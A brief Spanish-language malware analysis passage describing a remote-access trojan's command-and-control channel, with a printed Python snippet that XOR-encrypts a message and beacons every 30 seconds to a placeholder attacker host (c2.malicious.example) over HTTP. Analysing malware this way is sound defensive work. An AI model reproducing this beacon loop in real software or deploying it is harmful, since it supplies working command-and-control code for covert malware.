Muestra analizada

Comunicación C2

El RAT utiliza HTTP sobre puerto 8080 con cifrado XOR básico:

1def xor_encrypt(data, key):
2    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
3
4# Beacon al C2 cada 30 segundos
5import time, requests
6while True:
7    r = requests.post("http://c2.malicious.example/beacon",
8                      data=xor_encrypt(b"alive", b"secret"))
9    time.sleep(30)
